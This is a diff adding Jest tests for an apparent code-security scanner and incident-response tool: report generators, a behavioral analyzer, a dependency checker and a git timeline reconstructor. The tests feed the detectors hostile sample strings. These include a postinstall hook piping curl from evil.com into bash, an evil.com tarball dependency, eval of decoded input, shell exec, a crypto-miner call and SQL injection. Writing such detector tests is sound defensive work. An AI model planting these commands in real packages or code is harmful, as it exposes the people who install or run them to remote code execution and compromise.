@@ -686,4 +686,681 @@ line4`;
       }
     });
   });
+
+  describe('SARIF Reporter', () => {
+    let SARIFReporter;
+    
+    beforeAll(() => {
+      SARIFReporter = require('../scripts/fix-layer-8-security/reporters/sarif-reporter');
+    });
+
+    test('should generate valid SARIF 2.1.0 output', () => {
+      const reporter = new SARIFReporter();
+      const scanResult = {
+        findings: [
+          {
+            signatureId: 'NEUROLINT-IOC-001',
+            signatureName: 'Eval Usage',
+            severity: 'critical',
+            file: 'test.js',
+            line: 10,
+            column: 5,
+            matchedText: 'eval(atob(x))',
+            description: 'Dangerous eval usage',
+            remediation: 'Remove eval',
+            category: 'code-injection',
+            confidence: 0.95
+          }
+        ],
+        stats: { filesScanned: 100, filesSkipped: 5 }
+      };
+      
+      const output = reporter.generateReport(scanResult, { targetPath: '/test' });
+      const parsed = JSON.parse(output);
+      
+      expect(parsed.$schema).toContain('sarif-schema-2.1.0');
+      expect(parsed.version).toBe('2.1.0');
+      expect(parsed.runs).toBeDefined();
+      expect(parsed.runs[0].tool.driver.name).toContain('NeuroLint');
+    });
+
+    test('should generate rules from findings', () => {
+      const reporter = new SARIFReporter();
+      const scanResult = {
+        findings: [
+          { signatureId: 'TEST-001', signatureName: 'Test Rule', severity: 'high', description: 'Test' },
+          { signatureId: 'TEST-002', signatureName: 'Test Rule 2', severity: 'medium', description: 'Test 2' }
+        ],
+        stats: {}
+      };
+      
+      const output = reporter.generateReport(scanResult, {});
+      const parsed = JSON.parse(output);
+      
+      expect(parsed.runs[0].tool.driver.rules.length).toBe(2);
+    });
+
+    test('should map severity to SARIF levels correctly', () => {
+      const reporter = new SARIFReporter();
+      const scanResult = {
+        findings: [
+          { signatureId: 'CRIT-001', severity: 'critical', signatureName: 'Critical', file: 'a.js' },
+          { signatureId: 'HIGH-001', severity: 'high', signatureName: 'High', file: 'b.js' },
+          { signatureId: 'MED-001', severity: 'medium', signatureName: 'Medium', file: 'c.js' },
+          { signatureId: 'LOW-001', severity: 'low', signatureName: 'Low', file: 'd.js' }
+        ],
+        stats: {}
+      };
+      
+      const output = reporter.generateReport(scanResult, {});
+      const parsed = JSON.parse(output);
+      const results = parsed.runs[0].results;
+      
+      expect(results[0].level).toBe('error');
+      expect(results[1].level).toBe('error');
+      expect(results[2].level).toBe('warning');
+      expect(results[3].level).toBe('note');
+    });
+
+    test('should validate SARIF schema', () => {
+      const reporter = new SARIFReporter();
+      const scanResult = { findings: [], stats: {} };
+      
+      const output = reporter.generateReport(scanResult, {});
+      const validation = reporter.validateSchema(output);
+      
+      expect(validation.valid).toBe(true);
+    });
+
+    test('should generate fingerprints for findings', () => {
+      const reporter = new SARIFReporter();
+      const scanResult = {
+        findings: [
+          { signatureId: 'TEST-001', signatureName: 'Test', severity: 'high', file: 'test.js', line: 10, column: 5 }
+        ],
+        stats: {}
+      };
+      
+      const output = reporter.generateReport(scanResult, {});
+      const parsed = JSON.parse(output);
+      
+      expect(parsed.runs[0].results[0].fingerprints).toBeDefined();
+      expect(parsed.runs[0].results[0].fingerprints.primaryLocationLineHash).toBeDefined();
+    });
+
+    test('should include security severity scores', () => {
+      const reporter = new SARIFReporter();
+      const scanResult = {
+        findings: [
+          { signatureId: 'CRIT-001', severity: 'critical', signatureName: 'Critical', file: 'a.js' }
+        ],
+        stats: {}
+      };
+      
+      const output = reporter.generateReport(scanResult, {});
+      const parsed = JSON.parse(output);
+      
+      expect(parsed.runs[0].tool.driver.rules[0].properties.securitySeverity).toBe('9.0');
+    });
+  });
+
+  describe('HTML Reporter', () => {
+    let HTMLReporter;
+    
+    beforeAll(() => {
+      HTMLReporter = require('../scripts/fix-layer-8-security/reporters/html-reporter');
+    });
+
+    test('should generate valid HTML document', () => {
+      const reporter = new HTMLReporter();
+      const scanResult = {
+        findings: [
+          { signatureId: 'TEST-001', signatureName: 'Test', severity: 'high', file: 'test.js', line: 10 }
+        ],
+        stats: { filesScanned: 50 }
+      };
+      
+      const output = reporter.generateReport(scanResult, {});
+      
+      expect(output).toContain('<!DOCTYPE html>');
+      expect(output).toContain('<html');
+      expect(output).toContain('</html>');
+      expect(output).toContain('Security Forensics Report');
+    });
+
+    test('should include embedded CSS', () => {
+      const reporter = new HTMLReporter();
+      const scanResult = { findings: [], stats: {} };
+      
+      const output = reporter.generateReport(scanResult, {});
+      
+      expect(output).toContain('<style>');
+      expect(output).toContain('</style>');
+      expect(output).toContain('--color-critical');
+    });
+
+    test('should include embedded JavaScript', () => {
+      const reporter = new HTMLReporter();
+      const scanResult = { findings: [], stats: {} };
+      
+      const output = reporter.generateReport(scanResult, {});
+      
+      expect(output).toContain('<script>');
+      expect(output).toContain('</script>');
+    });
+
+    test('should show CLEAN status when no findings', () => {
+      const reporter = new HTMLReporter();
+      const scanResult = { findings: [], stats: { filesScanned: 100 } };
+      
+      const output = reporter.generateReport(scanResult, {});
+      
+      expect(output).toContain('CLEAN');
+      expect(output).toContain('No Issues Detected');
+    });
+
+    test('should show CRITICAL status when critical findings exist', () => {
+      const reporter = new HTMLReporter();
+      const scanResult = {
+        findings: [
+          { signatureId: 'CRIT-001', severity: 'critical', signatureName: 'Critical Issue', file: 'test.js' }
+        ],
+        stats: {}
+      };
+      
+      const output = reporter.generateReport(scanResult, {});
+      
+      expect(output).toContain('CRITICAL');
+      expect(output).toContain('Immediate Action Required');
+    });
+
+    test('should generate remediation checklist', () => {
+      const reporter = new HTMLReporter({ includeRemediation: true });
+      const scanResult = {
+        findings: [
+          { signatureId: 'TEST-001', severity: 'high', signatureName: 'Test', remediation: 'Fix this issue', file: 'a.js' },
+          { signatureId: 'TEST-002', severity: 'high', signatureName: 'Test', remediation: 'Fix this issue', file: 'b.js' }
+        ],
+        stats: {}
+      };
+      
+      const output = reporter.generateReport(scanResult, {});
+      
+      expect(output).toContain('Remediation Checklist');
+      expect(output).toContain('checkbox');
+    });
+
+    test('should escape HTML in findings', () => {
+      const reporter = new HTMLReporter();
+      const scanResult = {
+        findings: [
+          { signatureId: 'XSS-001', severity: 'high', signatureName: '<script>alert(1)</script>', file: 'test.js' }
+        ],
+        stats: {}
+      };
+      
+      const output = reporter.generateReport(scanResult, {});
+      
+      expect(output).not.toContain('<script>alert(1)</script>');
+      expect(output).toContain('&lt;script&gt;');
+    });
+  });
+
+  describe('Behavioral Analyzer', () => {
+    let BehavioralAnalyzer;
+    
+    beforeAll(() => {
+      BehavioralAnalyzer = require('../scripts/fix-layer-8-security/detectors/behavioral-analyzer');
+    });
+
+    test('should detect direct eval() calls', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'const result = eval(userInput);';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      expect(findings.length).toBeGreaterThan(0);
+      const evalFinding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-001');
+      expect(evalFinding).toBeDefined();
+      expect(evalFinding.severity).toBe('critical');
+    });
+
+    test('should detect setTimeout with string argument', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'setTimeout("alert(1)", 1000);';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-002');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should detect Function constructor', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'const fn = new Function("return " + code);';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-005');
+      expect(finding).toBeDefined();
+    });
+
+    test('should detect network requests to IP addresses', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'fetch("http://192.168.1.100/api/data");';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-007');
+      expect(finding).toBeDefined();
+      expect(finding.category).toBe('network');
+    });
+
+    test('should detect requests to suspicious domains', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'fetch("https://pastebin.com/raw/abc123");';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-008');
+      expect(finding).toBeDefined();
+    });
+
+    test('should detect shell command execution', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'const cp = require("child_process"); cp.exec("bash -c whoami");';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-009');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+    });
+
+    test('should detect crypto mining calls', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'CoinHive.Anonymous("site-key").start();';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-010');
+      expect(finding).toBeDefined();
+      expect(finding.category).toBe('crypto-mining');
+    });
+
+    test('should detect prototype pollution patterns', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'obj.__proto__.isAdmin = true;';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-012');
+      expect(finding).toBeDefined();
+    });
+
+    test('should detect base64 encoded malicious payloads', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const maliciousBase64 = Buffer.from('eval(code)').toString('base64');
+      const longBase64 = maliciousBase64.padEnd(101, 'A');
+      const code = `const payload = "${longBase64}";`;
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-018');
+      expect(finding).toBeDefined();
+    });
+
+    test('should detect SQL injection via template literals', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'const query = `SELECT * FROM users WHERE id = ${req.params.id}`;';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-019');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+    });
+
+    test('should handle TypeScript files', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'const result: string = eval(input as string);';
+      
+      const findings = analyzer.analyze(code, 'test.ts');
+      
+      expect(findings.length).toBeGreaterThan(0);
+    });
+
+    test('should handle JSX files', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'const App = () => <div dangerouslySetInnerHTML={{__html: eval(data)}} />;';
+      
+      const findings = analyzer.analyze(code, 'test.jsx');
+      
+      expect(findings.length).toBeGreaterThan(0);
+    });
+
+    test('should handle parse errors gracefully', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = 'const x = {{{invalid syntax';
+      
+      const findings = analyzer.analyze(code, 'test.js');
+      
+      expect(Array.isArray(findings)).toBe(true);
+    });
+  });
+
+  describe('Dependency Differ', () => {
+    let DependencyDiffer;
+    
+    beforeAll(() => {
+      DependencyDiffer = require('../scripts/fix-layer-8-security/detectors/dependency-differ');
+    });
+
+    test('should detect known malicious packages', () => {
+      const differ = new DependencyDiffer();
+      const deps = { 'event-stream': '3.3.4' };
+      
+      const findings = differ.checkForMaliciousPackages(deps, 'package.json');
+      
+      expect(findings.length).toBeGreaterThan(0);
+      expect(findings[0].severity).toBe('critical');
+      expect(findings[0].signatureId).toBe('NEUROLINT-DEP-002');
+    });
+
+    test('should detect typosquatting attempts', () => {
+      const differ = new DependencyDiffer();
+      const deps = { 'expresss': '4.0.0' };
+      
+      const findings = differ.detectTyposquatting(deps, 'package.json');
+      
+      expect(findings.length).toBeGreaterThan(0);
+      expect(findings[0].signatureId).toBe('NEUROLINT-DEP-003');
+    });
+
+    test('should detect git URL dependencies', () => {
+      const differ = new DependencyDiffer();
+      const deps = { 'my-package': 'git+https://github.com/user/repo.git' };
+      
+      const findings = differ.checkSuspiciousVersions(deps, 'package.json');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-DEP-005');
+      expect(finding).toBeDefined();
+    });
+
+    test('should detect suspicious URL dependencies', () => {
+      const differ = new DependencyDiffer();
+      const deps = { 'my-package': 'https://evil.com/malicious.tgz' };
+      
+      const findings = differ.checkSuspiciousVersions(deps, 'package.json');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-DEP-006');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should detect dangerous install scripts', () => {
+      const differ = new DependencyDiffer();
+      const packageJson = {
+        scripts: {
+          postinstall: 'curl https://evil.com/script.sh | bash'
+        }
+      };
+      
+      const findings = differ.checkScriptInjection(packageJson, 'package.json');
+      
+      expect(findings.length).toBeGreaterThan(0);
+      expect(findings[0].severity).toBe('critical');
+    });
+
+    test('should calculate Levenshtein distance correctly', () => {
+      const differ = new DependencyDiffer();
+      
+      expect(differ.levenshteinDistance('lodash', 'lodash')).toBe(0);
+      expect(differ.levenshteinDistance('lodash', 'lodahs')).toBe(2);
+      expect(differ.levenshteinDistance('react', 'react-dom')).toBe(4);
+    });
+
+    test('should generate report summary', () => {
+      const differ = new DependencyDiffer();
+      const findings = [
+        { severity: 'critical' },
+        { severity: 'high' },
+        { severity: 'medium' },
+        { severity: 'low' }
+      ];
+      
+      const report = differ.generateReport(findings);
+      
+      expect(report.summary.total).toBe(4);
+      expect(report.summary.critical).toBe(1);
+      expect(report.summary.high).toBe(1);
+    });
+
+    test('should detect local file dependencies', () => {
+      const differ = new DependencyDiffer();
+      const deps = { 'my-local': 'file:../local-package' };
+      
+      const findings = differ.checkSuspiciousVersions(deps, 'package.json');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-DEP-007');
+      expect(finding).toBeDefined();
+    });
+  });
+
+  describe('Timeline Reconstructor', () => {
+    let TimelineReconstructor;
+    
+    beforeAll(() => {
+      TimelineReconstructor = require('../scripts/fix-layer-8-security/forensics/timeline-reconstructor');
+    });
+
+    test('should detect when not in git repository', () => {
+      const reconstructor = new TimelineReconstructor();
+      
+      const result = reconstructor.reconstructTimeline('/tmp/not-a-git-repo');
+      
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Not a git repository');
+    });
+
+    test('should load suspicious patterns', () => {
+      const reconstructor = new TimelineReconstructor();
+      
+      expect(reconstructor.suspiciousPatterns).toBeDefined();
+      expect(reconstructor.suspiciousPatterns.length).toBeGreaterThan(0);
+    });
+
+    test('should assess risk correctly', () => {
+      const reconstructor = new TimelineReconstructor();
+      
+      const criticalResult = { findings: [{ severity: 'critical' }, { severity: 'critical' }] };
+      const cleanResult = { findings: [] };
+      
+      const criticalRisk = reconstructor.assessRisk(criticalResult);
+      const cleanRisk = reconstructor.assessRisk(cleanResult);
+      
+      expect(criticalRisk.level).toBe('critical');
+      expect(cleanRisk.level).toBe('clean');
+    });
+
+    test('should generate risk summary', () => {
+      const reconstructor = new TimelineReconstructor();
+      
+      const summary = reconstructor.generateRiskSummary('critical', 5);
+      
+      expect(summary).toContain('CRITICAL');
+      expect(summary).toContain('5');
+    });
+
+    test('should create findings with required fields', () => {
+      const reconstructor = new TimelineReconstructor();
+      
+      const finding = reconstructor.createFinding({
+        signatureId: 'TEST-001',
+        signatureName: 'Test Finding',
+        severity: 'high',
+        description: 'Test description'
+      });
+      
+      expect(finding.id).toBeDefined();
+      expect(finding.timestamp).toBeDefined();
+      expect(finding.confidence).toBeDefined();
+    });
+
+    test('should reconstruct timeline in git repository', () => {
+      const reconstructor = new TimelineReconstructor({ maxCommits: 10 });
+      
+      const result = reconstructor.reconstructTimeline(process.cwd());
+      
+      expect(result.success).toBe(true);
+      expect(Array.isArray(result.timeline)).toBe(true);
+      expect(result.stats).toBeDefined();
+    });
+
+    test('should generate report from result', () => {
+      const reconstructor = new TimelineReconstructor();
+      const mockResult = {
+        success: true,
+        timeline: [
+          {
+            shortHash: 'abc123',
+            author: 'Test',
+            date: new Date().toISOString(),
+            subject: 'Test commit',
+            newFiles: ['a.js'],
+            modifiedFiles: ['b.js'],
+            deletedFiles: [],
+            suspiciousChanges: []
+          }
+        ],
+        findings: [],
+        stats: { totalCommits: 1 }
+      };
+      
+      const report = reconstructor.generateReport(mockResult);
+      
+      expect(report.success).toBe(true);
+      expect(report.timeline.length).toBe(1);
+      expect(report.riskAssessment).toBeDefined();
+    });
+  });
+
+  describe('Incident Response', () => {
+    test('should expose incidentResponse method', () => {
+      const layer8 = new Layer8();
+      expect(typeof layer8.incidentResponse).toBe('function');
+    });
+
+    test('should run incident response with all phases', async () => {
+      const layer8 = new Layer8({ mode: 'quick' });
+      
+      const result = await layer8.incidentResponse(fixturesPath, {
+        includeTimeline: true,
+        includeDependencies: true,
+        includeBehavioral: true
+      });
+      
+      expect(result.timestamp).toBeDefined();
+      expect(result.targetPath).toBeDefined();
+      expect(result.phases).toBeDefined();
+      expect(result.summary).toBeDefined();
+      expect(result.recommendations).toBeDefined();
+    });
+
+    test('should calculate risk levels correctly', async () => {
+      const layer8 = new Layer8({ mode: 'quick' });
+      
+      const result = await layer8.incidentResponse(fixturesPath, {
+        includeTimeline: false,
+        includeDependencies: false,
+        includeBehavioral: false
+      });
+      
+      expect(['clean', 'low', 'medium', 'high', 'critical']).toContain(result.summary.riskLevel);
+    });
+
+    test('should generate recommendations', async () => {
+      const layer8 = new Layer8({ mode: 'quick' });
+      
+      const result = await layer8.incidentResponse(fixturesPath);
+      
+      expect(Array.isArray(result.recommendations)).toBe(true);
+      if (result.recommendations.length > 0) {
+        expect(result.recommendations[0].priority).toBeDefined();
+        expect(result.recommendations[0].action).toBeDefined();
+      }
+    });
+
+    test('should aggregate findings from all phases', async () => {
+      const layer8 = new Layer8({ mode: 'quick' });
+      
+      const result = await layer8.incidentResponse(fixturesPath, {
+        includeTimeline: true,
+        includeDependencies: true,
+        includeBehavioral: true
+      });
+      
+      expect(result.allFindings).toBeDefined();
+      expect(Array.isArray(result.allFindings)).toBe(true);
+    });
+
+    test('should track execution time', async () => {
+      const layer8 = new Layer8({ mode: 'quick' });
+      
+      const result = await layer8.incidentResponse(fixturesPath);
+      
+      expect(result.summary.executionTimeMs).toBeDefined();
+      expect(typeof result.summary.executionTimeMs).toBe('number');
+    });
+
+    test('should expose printIncidentReport method', () => {
+      const layer8 = new Layer8();
+      expect(typeof layer8.printIncidentReport).toBe('function');
+    });
+
+    test('should set success status and track phase failures', async () => {
+      const layer8 = new Layer8({ mode: 'quick' });
+      
+      const result = await layer8.incidentResponse(fixturesPath, {
+        includeTimeline: true,
+        includeDependencies: true,
+        includeBehavioral: true
+      });
+      
+      expect(result.success).toBeDefined();
+      expect(typeof result.success).toBe('boolean');
+      expect(result.summary.phasesCompleted).toBeDefined();
+      expect(result.summary.phasesTotal).toBeDefined();
+      expect(result.summary.phasesFailed).toBeDefined();
+    });
+  });
+
+  describe('CLI Incident Response Command', () => {
+    test('should show help for security:incident-response command', () => {
+      const output = execSync('node cli.js help 2>&1', { encoding: 'utf8' });
+      
+      expect(output).toContain('security:incident-response');
+    });
+
+    test('should run incident response via CLI', () => {
+      const output = execSync(
+        `node cli.js security:incident-response ${fixturesPath} --quick 2>&1`,
+        { encoding: 'utf8', timeout: 60000 }
+      );
+      
+      expect(output).toContain('INCIDENT RESPONSE');
+    });
+
+    test('should support --json output for incident response', () => {
+      const output = execSync(
+        `node cli.js security:incident-response ${fixturesPath} --quick --json 2>&1`,
+        { encoding: 'utf8', timeout: 60000 }
+      );
+      
+      const jsonMatch = output.match(/\{[\s\S]*\}/);
+      expect(jsonMatch).toBeTruthy();
+      expect(() => JSON.parse(jsonMatch[0])).not.toThrow();
+    });
+  });
 });
